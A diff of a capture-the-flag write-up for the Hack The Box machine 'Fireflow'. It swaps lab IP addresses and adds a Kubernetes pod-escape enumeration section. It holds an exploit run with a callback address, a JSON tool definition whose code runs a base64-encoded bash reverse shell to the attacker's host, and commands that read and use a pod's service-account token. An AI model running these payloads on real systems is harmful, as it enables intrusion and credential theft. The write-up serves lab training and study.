@@ -8,8 +8,8 @@ Today we'll do the [Fireflow](https://app.hackthebox.com/machines/Fireflow) HTB'
 First of all we need to add the register to `/etc/hosts`:
 
 ```
-$ echo "10.129.244.214 fireflow.htb" | sudo tee -a /etc/hosts
-10.129.244.214 fireflow.htb
+$ echo "10.129.94.204 fireflow.htb" | sudo tee -a /etc/hosts
+10.129.94.204 fireflow.htb
 $
 ```
 
@@ -24,7 +24,7 @@ You can use any port scanner, like [Rustscan](https://github.com/bee-san/RustSca
 First, let's run it and then use Nmap to run default scripts (`-A`, naabu are currently implementing services and versions detection, so if you're reading this, you should check the repository for more information)
 
 ```
-[3,979s][~] ᛋᛋ naabu -host 10.129.244.214 -p -                
+[3,979s][~] ᛋᛋ naabu -host 10.129.94.204 -p -                
 
                   __
   ___  ___  ___ _/ /  __ __
@@ -36,17 +36,17 @@ First, let's run it and then use Nmap to run default scripts (`-A`, naabu are cu
 [INF] Current naabu version 2.6.1 (latest)
 [WRN] UI Dashboard is disabled, Use -dashboard option to enable
 [INF] Running CONNECT scan with non root privileges
-10.129.244.214:22
-10.129.244.214:443
-[INF] Found 2 ports on host 10.129.244.214 (10.129.244.214)
+10.129.94.204:22
+10.129.94.204:443
+[INF] Found 2 ports on host 10.129.94.204 (10.129.244.214)
 ```
 
 Alright, now we can use the nmap default scripts to get banners and others
 
 ```
-[2m14,942s][~] ᛋᛋ sudo nmap -A 10.129.244.214 -p22,443,65535 -T5
+[2m14,942s][~] ᛋᛋ sudo nmap -A 10.129.94.204 -p22,443,65535 -T5
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-18 16:40 -0300
-Nmap scan report for fireflow.htb (110.129.244.214)
+Nmap scan report for fireflow.htb (110.129.94.204)
 Host is up (0.17s latency).
 
 PORT      STATE  SERVICE  VERSION
@@ -76,7 +76,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 TRACEROUTE (using port 65535/tcp)
 HOP RTT       ADDRESS
 1   222.76 ms 10.10.14.1
-2   222.83 ms fireflow.htb (10.129.244.214)
+2   222.83 ms fireflow.htb (10.129.94.204)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 24.57 seconds
@@ -166,8 +166,8 @@ flow                    [Status: 200, Size: 1142, Words: 132, Lines: 25, Duratio
 So we find the flow subdomain, let's add it to our `/etc/hosts`
 
 ```
-[14ms][~/Hacking/CTFs/Fireflow] ᛋᛋ echo "10.129.244.214 flow.fireflow.htb" | sudo tee -a /etc/hosts
-10.129.244.214 flow.fireflow.htb
+[14ms][~/Hacking/CTFs/Fireflow] ᛋᛋ echo "10.129.94.204 flow.fireflow.htb" | sudo tee -a /etc/hosts
+10.129.94.204 flow.fireflow.htb
 [1,463s][~/Hacking/CTFs/Fireflow] ᛋᛋ 
 ```
 
@@ -190,7 +190,7 @@ We discovered a valid subdomain, so we can suppose that some services may respon
 [INF] Running CONNECT scan with non root privileges
 flow.fireflow.htb:22
 flow.fireflow.htb:443
-[INF] Found 2 ports on host flow.fireflow.htb (10.129.244.214)
+[INF] Found 2 ports on host flow.fireflow.htb (10.129.94.204)
 [2m15,336s][~/Hacking/CTFs/Fireflow] ᛋᛋ
 ```
 
@@ -199,9 +199,9 @@ Same ports open, let's check if something changed in nmap default scripts
 ```
 [2m15,336s][~/Hacking/CTFs/Fireflow] ᛋᛋ sudo nmap -A flow.fireflow.htb -p22,443,65535 -T5
 Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-19 16:34 -0300
-Nmap scan report for flow.fireflow.htb (10.129.244.214)
+Nmap scan report for flow.fireflow.htb (10.129.94.204)
 Host is up (0.15s latency).
-rDNS record for 10.129.244.214: fireflow.htb
+rDNS record for 10.129.94.204: fireflow.htb
 
 PORT      STATE  SERVICE   VERSION
 22/tcp    open   ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
@@ -231,7 +231,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 TRACEROUTE (using port 65535/tcp)
 HOP RTT       ADDRESS
 1   147.17 ms 10.10.14.1
-2   147.47 ms fireflow.htb (10.129.244.214)
+2   147.47 ms fireflow.htb (10.129.94.204)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 19.31 seconds
@@ -449,9 +449,9 @@ options:
 Wasn't that hard to build the command with the parameters that I already know, I just started my shell handler, [penelope](https://github.com/brightio/penelope), and then ran the exploit:
 
 ```
-[142ms][2][main][~/Hacking/CTFs/Fireflow/CVE-2026-33017] ᛋᛋ python exploit.py --lhost 10.10.15.160 --lport 4444 --url https://flow.fireflow.htb --flow-id 7d84d636-af65-42e4-ac38-26e867052c25
+[142ms][2][main][~/Hacking/CTFs/Fireflow/CVE-2026-33017] ᛋᛋ python exploit.py --lhost 10.10.14.51 --lport 4444 --url https://flow.fireflow.htb --flow-id 7d84d636-af65-42e4-ac38-26e867052c25
 [*] Target: https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?event_delivery=direct&log_builds=false
-[*] Callback: 10.10.15.160:4444
+[*] Callback: 10.10.14.51:4444
 [*] Request returned no response (expected if shell connected): HTTPSConnectionPool(host='flow.fireflow.htb', port=443): Max retries exceeded with url: /api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?event_delivery=direct&log_builds=false (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate (_ssl.c:1082)')))
 [530ms][main][~/Hacking/CTFs/Fireflow/CVE-2026-33017] ᛋᛋ
 ```
@@ -479,9 +479,9 @@ def send_payload():
 And then ran it again:
 
 ```
-[1m12,995s][main][~/Hacking/CTFs/Fireflow/CVE-2026-33017] ᛋᛋ python exploit.py --lhost 10.10.15.160 --lport 4444 --url https://flow.fireflow.htb --flow-id 7d84d636-af65-42e4-ac38-26e867052c25
+[1m12,995s][main][~/Hacking/CTFs/Fireflow/CVE-2026-33017] ᛋᛋ python exploit.py --lhost 10.10.14.51 --lport 4444 --url https://flow.fireflow.htb --flow-id 7d84d636-af65-42e4-ac38-26e867052c25
 [*] Target: https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?event_delivery=direct&log_builds=false
-[*] Callback: 10.10.15.160:4444
+[*] Callback: 10.10.14.51:4444
 [14,243s][130][main][~/Hacking/CTFs/Fireflow/CVE-2026-33017] ᛋᛋ 
 ```
 
@@ -658,7 +658,7 @@ It works! Now I'll just try using it with ssh (the port 22 was open too):
 
 And it works too! Now let's keep escalating our privileges to root!
 
-# Local Privilege Escalation to Root
+# Local Privilege Escalation to `mcp@mcp-server`
 
 First of all I'll search for any configuration file in my home directory and for any creds in the environment:
 
@@ -692,7 +692,7 @@ HOME=/home/nightfall
 LANG=en_US.UTF-8
 HISTFILE=/dev/null
 LS_COLORS=<this env is a bit large, but haven't nothing interesting>
-SSH_CONNECTION=10.10.15.160 39650 10.129.89.39 22
+SSH_CONNECTION=10.10.14.51 39650 10.129.89.39 22
 LESSCLOSE=/usr/bin/lesspipe %s %s
 XDG_SESSION_CLASS=user
 TERM=xterm-256color
@@ -701,7 +701,7 @@ USER=nightfall
 SHLVL=3
 XDG_SESSION_ID=13
 XDG_RUNTIME_DIR=/run/user/1000
-SSH_CLIENT=10.10.15.160 39650 22
+SSH_CLIENT=10.10.14.51 39650 22
 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
 DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
 _=/usr/bin/env
@@ -1248,7 +1248,7 @@ Alright, now I just send this:
   "name": "ping_me",
   "description": "Ping my device",
   "properties": {},
-  "code": "import subprocess as s;s.run(['/usr/bin/nc', '-vz', '-w', '5', '10.10.15.160', '4445'], stdout=s.PIPE, stderr=s.STDOUT, text=True)"
+  "code": "import subprocess as s;s.run(['/usr/bin/nc', '-vz', '-w', '5', '10.10.14.51', '4445'], stdout=s.PIPE, stderr=s.STDOUT, text=True)"
 }
 ```
 
@@ -1314,16 +1314,16 @@ I decided that I should skip the ping process and directly try sending a reverse
 
 ```
 (Penelope)─(Session [1])> listeners add -i tun0 -p 4445
-[+] Listening for reverse shells on 10.10.15.160:4445 
+[+] Listening for reverse shells on 10.10.14.51:4445 
 (Penelope)─(Session [1])> 
 ```
 
 ```
 {
   "name": "rev_me",
-  "description": "Reverse shell to 10.10.15.160:4445",
+  "description": "Reverse shell to 10.10.14.51:4445",
   "properties": {},
-  "code": "import subprocess as s;s.run(['/bin/sh', '-c', 'printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTYwLzQ0NDUgMD4mMSkgJg==|base64 -d|bash'], stdout=s.PIPE, stderr=s.STDOUT, text=True)"
+  "code": "import subprocess as s;s.run(['/bin/sh', '-c', 'printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTEvNDQ0NSAwPiYxKSAm|base64 -d|bash'], stdout=s.PIPE, stderr=s.STDOUT, text=True)"
 }
 ```
 
@@ -1351,11 +1351,13 @@ So let's run it:
 and (🥁🥁🥁):
 
 ```
-[+] [New Reverse Shell] => mcp-server-54464cb475-29ztf 10.129.244.214 Linux-x86_64 👤 mcp(1000) 😍️ Session ID <2>
+[+] [New Reverse Shell] => mcp-server-54464cb475-29ztf 10.129.94.204 Linux-x86_64 👤 mcp(1000) 😍️ Session ID <2>
 (Penelope)─(Session [1])> 
 ```
 
-# Enumeration
+# Kubernetes Escaping: LPE to root
+
+## Environment Enumeration
 
 As I didn't confirmed the container and provider, I'll check the environment variables for anything, and then grep `/proc/self/cgroups` for any interesting strings:
 
@@ -1397,5 +1399,883 @@ mcp@mcp-server-54464cb475-29ztf:~$
 ```
 
 And here we go. I can strictly determine: we are inside a kubernetes pod.
+
+Before enumerating kubernetes-related stuff, I kept searching for other possible LPE attack surface. 
+
+```
+mcp@mcp-server-54464cb475-29ztf:/app$ find / -type f -perm -4000 2>/dev/null
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/passwd
+mcp@mcp-server-54464cb475-29ztf:/app$ which getcap
+mcp@mcp-server-54464cb475-29ztf:/app$ ss -tulpn
+bash: ss: command not found
+mcp@mcp-server-54464cb475-29ztf:/app$ 
+```
+
+As a container, it's expected to have a minimized installation, without common tools (like `ss` or `getcap`). Probably the only way to root is kubernetes escaping, as the process run as root:
+
+```bash
+nightfall@fireflow:~$ ps aux | grep contai
+root        1523  0.1  1.1 1796780 47492 ?       Ssl  17:30   0:01 /usr/bin/containerd
+root        1612  0.0  1.9 1908924 79292 ?       Ssl  17:30   0:00 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+root        2371  0.0  0.4 1240172 17100 ?       Sl   17:30   0:00 /var/lib/rancher/k3s/data/d76b59b2203578bb4cb3438338ccad2f0d3e194bef799a8957f21430b7d5f1e3/bin/containerd-shim-runc-v2 -namespace k8s.io -id 43c77eec83abdf0dd6a4de160385ac5db52755c2ff6071598b07f464053ebfd8 -address /run/k3s/containerd/containerd.sock
+root        2698  0.0  0.4 1239916 16512 ?       Sl   17:30   0:00 /var/lib/rancher/k3s/data/d76b59b2203578bb4cb3438338ccad2f0d3e194bef799a8957f21430b7d5f1e3/bin/containerd-shim-runc-v2 -namespace k8s.io -id 9424e2022f5775cc105e1a8534a089dbe2fdc2bd736ce8529e723c3d5b9f13ce -address /run/k3s/containerd/containerd.sock
+root        2732  0.1  0.4 1240172 17184 ?       Sl   17:30   0:01 /var/lib/rancher/k3s/data/d76b59b2203578bb4cb3438338ccad2f0d3e194bef799a8957f21430b7d5f1e3/bin/containerd-shim-runc-v2 -namespace k8s.io -id 528eca27f07dcce1148ca42f45c811b39abcc45a2929931be42124aadb295748 -address /run/k3s/containerd/containerd.sock
+root        2750  0.0  0.4 1240172 16844 ?       Sl   17:30   0:00 /var/lib/rancher/k3s/data/d76b59b2203578bb4cb3438338ccad2f0d3e194bef799a8957f21430b7d5f1e3/bin/containerd-shim-runc-v2 -namespace k8s.io -id 32a383d304c3122a4f19f0413ffaae17aca06b41d71d991a51090ffc1efb5fc0 -address /run/k3s/containerd/containerd.sock
+root        3076  0.1  0.4 1239916 16796 ?       Sl   17:31   0:01 /var/lib/rancher/k3s/data/d76b59b2203578bb4cb3438338ccad2f0d3e194bef799a8957f21430b7d5f1e3/bin/containerd-shim-runc-v2 -namespace k8s.io -id 457feee4e750b78dc0172832e6d0e1abd05c6bc540d2172411e150cfa6aa1f17 -address /run/k3s/containerd/containerd.sock
+root        3965  0.1  0.4 1239916 16888 ?       Sl   17:31   0:01 /var/lib/rancher/k3s/data/d76b59b2203578bb4cb3438338ccad2f0d3e194bef799a8957f21430b7d5f1e3/bin/containerd-shim-runc-v2 -namespace k8s.io -id ace2f8b4aaf958b84f7f2d1813983463728da235dc90a4eb160cd9769d6fe4c7 -address /run/k3s/containerd/containerd.sock
+root        4008  0.0  0.4 1239916 16976 ?       Sl   17:31   0:00 /var/lib/rancher/k3s/data/d76b59b2203578bb4cb3438338ccad2f0d3e194bef799a8957f21430b7d5f1e3/bin/containerd-shim-runc-v2 -namespace k8s.io -id bec9ea2d4230ddec1a9502e5fc30be12b79a50cf9ee0aca96298eade24f3cc72 -address /run/k3s/containerd/containerd.sock
+root        8744  1.5  3.9 1437152 157488 ?      Sl   17:37   0:09 containerd 
+nightfa+    9976  0.0  0.0   6544  2276 pts/0    S+   17:47   0:00 grep --color=auto contai
+nightfall@fireflow:~$
+```
+
+## Kubernetes Enumeration
+
+First of all, let's check the `/var/run/secrets/kubernetes.io/serviceaccount/` (where we can find stuff like `ca.crt`, `token`, etc):
+
+```bash
+mcp@mcp-server-54464cb475-29ztf:/app$ ls -la /var/run/secrets/kubernetes.io/serviceaccount/
+total 4
+drwxrwxrwt 3 root root  140 Aug 27 17:37 .
+drwxr-xr-x 3 root root 4096 Aug 27 17:40 ..
+drwxr-xr-x 2 root root  100 Aug 27 17:37 ..2026_08_27_17_37_47.95596828
+lrwxrwxrwx 1 root root   30 Aug 27 17:37 ..data -> ..2026_08_27_17_37_47.95596828
+lrwxrwxrwx 1 root root   13 Aug 27 17:31 ca.crt -> ..data/ca.crt
+lrwxrwxrwx 1 root root   16 Aug 27 17:31 namespace -> ..data/namespace
+lrwxrwxrwx 1 root root   12 Aug 27 17:31 token -> ..data/token
+mcp@mcp-server-54464cb475-29ztf:/app$ cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+default
+mcp@mcp-server-54464cb475-29ztf:/app$ cat /var/run/secrets/kubernetes.io/serviceaccount/token
+eyJhbGciOiJSUzI1NiIsImtpZCI6ImFQRTZ5R3JrSUpadmdid19HcHBTRTBYUFJZWUxqeGcxUHJIaFJjTEVSdm8ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODE5Mzg4MjY3LCJpYXQiOjE3ODc4NTIyNjcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNDIyOTA1ZDMtZTM5YS00NDFmLWFkYTQtM2NjYTExNmU2OTFkIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZmlyZWZsb3ciLCJ1aWQiOiI4NzI5MTU4OC0wMTc4LTRlNDItYTk5OC00MWE1MmZhNzNiOGUifSwicG9kIjp7Im5hbWUiOiJtY3Atc2VydmVyLTU0NDY0Y2I0NzUtMjl6dGYiLCJ1aWQiOiI3MDJhZmViYi00ZjUxLTRlZDUtYWE5OC1hYjZiMjU1M2E3MjgifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6Im1jcC1zYSIsInVpZCI6ImE1MzRmNTUxLWIyYjEtNGU2Ni1iZGE1LWU5YjVlMmE1NjAyYyJ9LCJ3YXJuYWZ0ZXIiOjE3ODc4NTU4NzR9LCJuYmYiOjE3ODc4NTIyNjcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0Om1jcC1zYSJ9.bJ9RNo7JqxPU4NqGv70Zs58vdtK-T-KXfRsggQVqeMYMnLI2KD5JLOroGjTP2jkEqDaJ29KyJ89GdKB3ZDnSr4yCEC9Z25ICPs1Tg0I-snnMfsmoZ3J1f8xCZ_4F2vReCEIbwxm6L7ctxxAuV3MgNAVOixDhzeJSttCbAgIkE83yGsjAr45d2Ja-HDzy3g8OiBX3wO0bzM3eG9qtWbKxZMikh5AXTPmBLoSymYOWjb7xjMjPw_tVYaoSyu_BhhzxN8zp2mo4PRxfEAds7gPNIeibEgCSNVdJaRUibxb2Wutw_clBzEHqslFXMva6fbgj3ew0z0LWBTgc7DuaC01t8g
+mcp@mcp-server-54464cb475-29ztf:/app$
+```
+
+The decoded token's payload is:
+
+```json
+{
+  "aud": [
+    "https://kubernetes.default.svc.cluster.local",
+    "k3s"
+  ],
+  "exp": 1819388267,
+  "iat": 1787852267,
+  "iss": "https://kubernetes.default.svc.cluster.local",
+  "jti": "422905d3-e39a-441f-ada4-3cca116e691d",
+  "kubernetes.io": {
+    "namespace": "default",
+    "node": {
+      "name": "fireflow",
+      "uid": "87291588-0178-4e42-a998-41a52fa73b8e"
+    },
+    "pod": {
+      "name": "mcp-server-54464cb475-29ztf",
+      "uid": "702afebb-4f51-4ed5-aa98-ab6b2553a728"
+    },
+    "serviceaccount": {
+      "name": "mcp-sa",
+      "uid": "a534f551-b2b1-4e66-bda5-e9b5e2a5602c"
+    },
+    "warnafter": 1787855874
+  },
+  "nbf": 1787852267,
+  "sub": "system:serviceaccount:default:mcp-sa"
+}
+```
+
+We can also check for the `https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/version` endpoint, which without authentication must return a 403 error:
+
+```bash
+mcp@mcp-server-54464cb475-29ztf:/app$ curl -k https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/version
+{
+  "kind": "Status",
+  "apiVersion": "v1",
+  "metadata": {},
+  "status": "Failure",
+  "message": "Unauthorized",
+  "reason": "Unauthorized",
+  "code": 401
+}
+mcp@mcp-server-54464cb475-29ztf:/app$ 
+```
+
+We can export the token and the `ca.crt` (so we get authenticated and fix the ssl errors, freeing us of using -k every request):
+
+```bash
+mcp@mcp-server-54464cb475-29ztf:/app$ export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+export CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+mcp@mcp-server-54464cb475-29ztf:/app$ echo $TOKEN
+eyJhbGciOiJSUzI1NiIsImtpZCI6ImFQRTZ5R3JrSUpadmdid19HcHBTRTBYUFJZWUxqeGcxUHJIaFJjTEVSdm8ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODE5MzkxMTg2LCJpYXQiOjE3ODc4NTUxODYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiY2VhNGFlMWItN2IxZS00ODAwLTlmYWItYWJmZjQ1NDIxNjg1Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZmlyZWZsb3ciLCJ1aWQiOiI4NzI5MTU4OC0wMTc4LTRlNDItYTk5OC00MWE1MmZhNzNiOGUifSwicG9kIjp7Im5hbWUiOiJtY3Atc2VydmVyLTU0NDY0Y2I0NzUtMjl6dGYiLCJ1aWQiOiI3MDJhZmViYi00ZjUxLTRlZDUtYWE5OC1hYjZiMjU1M2E3MjgifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6Im1jcC1zYSIsInVpZCI6ImE1MzRmNTUxLWIyYjEtNGU2Ni1iZGE1LWU5YjVlMmE1NjAyYyJ9LCJ3YXJuYWZ0ZXIiOjE3ODc4NTg3OTN9LCJuYmYiOjE3ODc4NTUxODYsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0Om1jcC1zYSJ9.GCrRDpKWdUAeGkhlNJHQQ-fFebJSBeZxfWJs5hmuPs8wE07axHFkAAMY81vL8Ay3lpA7lnmP0WNYSUzWoeVCs1hX6dmiDo0yMuUT8hCbRV2_c7oZXOUb4TpkhfRkuQ-wpWuZqVf6sBF0X5b0MwaaVGO8RnFzNQnA_hKqku8ErSmPItCbrcIsoE9nFis9iYes6ijwKCcOXZXvZFXPVSDaRCSFmO0CEOSjmzTPYrfF6j4k-5jZVxtOW1wsJNQt8YMPhuWm8K8HCfzM0Ue8VOWHdR2-Xun8huXpxnOlbXblLZTcMO0RyOcvFPCSh-4IgpsDz2M2Dtj4p9Pg9_Kzij35YA
+mcp@mcp-server-54464cb475-29ztf:/app$ echo $CA
+/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+mcp@mcp-server-54464cb475-29ztf:/app$
+```
+
+After exporting this data, we can retry the `/version` endpoint:
+
+```bash
+mcp@mcp-server-54464cb475-29ztf:/app$ curl --cacert "$CA" \
+     -H "Authorization: Bearer $TOKEN" \
+     https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/version
+{
+  "major": "1",
+  "minor": "34",
+  "emulationMajor": "1",
+  "emulationMinor": "34",
+  "minCompatibilityMajor": "1",
+  "minCompatibilityMinor": "33",
+  "gitVersion": "v1.34.6+k3s1",
+  "gitCommit": "234e61326ca4e005522be1e69645c1ca5754121f",
+  "gitTreeState": "clean",
+  "buildDate": "2026-03-28T03:22:26Z",
+  "goVersion": "go1.24.13",
+  "compiler": "gc",
+  "platform": "linux/amd64"
+}
+mcp@mcp-server-54464cb475-29ztf:/app$
+```
+
+We can also try requesting the `/api` and `/apis` endpoints:
+
+```bash
+mcp@mcp-server-54464cb475-29ztf:/app$ curl --cacert "$CA" \
+     -H "Authorization: Bearer $TOKEN" \
+     https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api
+{
+  "kind": "APIVersions",
+  "versions": [
+    "v1"
+  ],
+  "serverAddressByClientCIDRs": [
+    {
+      "clientCIDR": "0.0.0.0/0",
+      "serverAddress": "10.129.94.204:6443"
+    }
+  ]
+}
+mcp@mcp-server-54464cb475-29ztf:/app$curl --cacert "$CA" \\
+     -H "Authorization: Bearer $TOKEN" \
+     https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/apis
+{
+  "kind": "APIGroupList",
+  "apiVersion": "v1",
+  "groups": [
+    {
+      "name": "apiregistration.k8s.io",
+      "versions": [
+        {
+          "groupVersion": "apiregistration.k8s.io/v1",
+          "version": "v1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "apiregistration.k8s.io/v1",
+        "version": "v1"
+      }
+    },
+    {
+      "name": "apps",
+      "versions": [
+        {
+          "groupVersion": "apps/v1",
+          "version": "v1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "apps/v1",
+        "version": "v1"
+      }
+    },
+    {
+      "name": "events.k8s.io",
+      "versions": [
+        {
+          "groupVersion": "events.k8s.io/v1",
+          "version": "v1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "events.k8s.io/v1",
+        "version": "v1"
+      }
+    },
+    {
+      "name": "authentication.k8s.io",
+      "versions": [
+        {
+          "groupVersion": "authentication.k8s.io/v1",
+          "version": "v1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "authentication.k8s.io/v1",
+        "version": "v1"
+      }
+    },
+    {
+      "name": "authorization.k8s.io",
+      "versions": [
+        {
+          "groupVersion": "authorization.k8s.io/v1",
+          "version": "v1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "authorization.k8s.io/v1",
+        "version": "v1"
+      }
+    },
+    {
+      "name": "autoscaling",
+      "versions": [
+        {
+          "groupVersion": "autoscaling/v2",
+          "version": "v2"
+        },
+        {
+          "groupVersion": "autoscaling/v1",
+          "version": "v1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "autoscaling/v2",
+        "version": "v2"
+      }
+    },
+    {
+      "name": "batch",
+      "versions": [
+        {
+          "groupVersion": "batch/v1",
+          "version": "v1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "batch/v1",
+        "version": "v1"
+      }
+    },
+    {
+      "name": "certificates.k8s.io",
+      "versions": [
+        {
+          "groupVersion": "certificates.k8s.io/v1",
+          "version": "v1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "certificates.k8s.io/v1",
+        "version": "v1"
+      }
+    },
+    {
+      "name": "networking.k8s.io",
+      "versions": [
+        {
+          "groupVersion": "networking.k8s.io/v1",
+          "version": "v1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "networking.k8s.io/v1",
+        "version": "v1"
+      }
+    },
+    {
+      "name": "policy",
+      "versions": [
+        {
+          "groupVersion": "policy/v1",
+          "version": "v1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "policy/v1",
+        "version": "v1"
+      }
+    },
+    {
+      "name": "rbac.authorization.k8s.io",
+      "versions": [
+        {
+          "groupVersion": "rbac.authorization.k8s.io/v1",
+          "version": "v1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "rbac.authorization.k8s.io/v1",
+        "version": "v1"
+      }
+    },
+    {
+      "name": "storage.k8s.io",
+      "versions": [
+        {
+          "groupVersion": "storage.k8s.io/v1",
+          "version": "v1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "storage.k8s.io/v1",
+        "version": "v1"
+      }
+    },
+    {
+      "name": "admissionregistration.k8s.io",
+      "versions": [
+        {
+          "groupVersion": "admissionregistration.k8s.io/v1",
+          "version": "v1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "admissionregistration.k8s.io/v1",
+        "version": "v1"
+      }
+    },
+    {
+      "name": "apiextensions.k8s.io",
+      "versions": [
+        {
+          "groupVersion": "apiextensions.k8s.io/v1",
+          "version": "v1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "apiextensions.k8s.io/v1",
+        "version": "v1"
+      }
+    },
+    {
+      "name": "scheduling.k8s.io",
+      "versions": [
+        {
+          "groupVersion": "scheduling.k8s.io/v1",
+          "version": "v1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "scheduling.k8s.io/v1",
+        "version": "v1"
+      }
+    },
+    {
+      "name": "coordination.k8s.io",
+      "versions": [
+        {
+          "groupVersion": "coordination.k8s.io/v1",
+          "version": "v1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "coordination.k8s.io/v1",
+        "version": "v1"
+      }
+    },
+    {
+      "name": "node.k8s.io",
+      "versions": [
+        {
+          "groupVersion": "node.k8s.io/v1",
+          "version": "v1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "node.k8s.io/v1",
+        "version": "v1"
+      }
+    },
+    {
+      "name": "discovery.k8s.io",
+      "versions": [
+        {
+          "groupVersion": "discovery.k8s.io/v1",
+          "version": "v1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "discovery.k8s.io/v1",
+        "version": "v1"
+      }
+    },
+    {
+      "name": "resource.k8s.io",
+      "versions": [
+        {
+          "groupVersion": "resource.k8s.io/v1",
+          "version": "v1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "resource.k8s.io/v1",
+        "version": "v1"
+      }
+    },
+    {
+      "name": "flowcontrol.apiserver.k8s.io",
+      "versions": [
+        {
+          "groupVersion": "flowcontrol.apiserver.k8s.io/v1",
+          "version": "v1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "flowcontrol.apiserver.k8s.io/v1",
+        "version": "v1"
+      }
+    },
+    {
+      "name": "helm.cattle.io",
+      "versions": [
+        {
+          "groupVersion": "helm.cattle.io/v1",
+          "version": "v1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "helm.cattle.io/v1",
+        "version": "v1"
+      }
+    },
+    {
+      "name": "k3s.cattle.io",
+      "versions": [
+        {
+          "groupVersion": "k3s.cattle.io/v1",
+          "version": "v1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "k3s.cattle.io/v1",
+        "version": "v1"
+      }
+    },
+    {
+      "name": "metrics.k8s.io",
+      "versions": [
+        {
+          "groupVersion": "metrics.k8s.io/v1beta1",
+          "version": "v1beta1"
+        }
+      ],
+      "preferredVersion": {
+        "groupVersion": "metrics.k8s.io/v1beta1",
+        "version": "v1beta1"
+      }
+    }
+  ]
+}
+mcp@mcp-server-54464cb475-29ztf:/app$ 
+```
+
+After this, we can check for our kubernetes permissions and capabilities. Firstly I tried using the `kubectl` application, so let's check if it's installed:
+
+```
+mcp@mcp-server-54464cb475-29ztf:/app$ which kubectl
+mcp@mcp-server-54464cb475-29ztf:/app$ find / -type f -name kubectl 2>/dev/null
+mcp@mcp-server-54464cb475-29ztf:/app$ 
+```
+
+Nothing. If python is installed I can use [this gist](https://gist.github.com/Yyax13/82fc074c69a18ff8b51129c90873390f) as a `kubectl`, but in python and without support for a few things. Let's check it:
+
+```
+mcp@mcp-server-54464cb475-29ztf:/app$ which python3
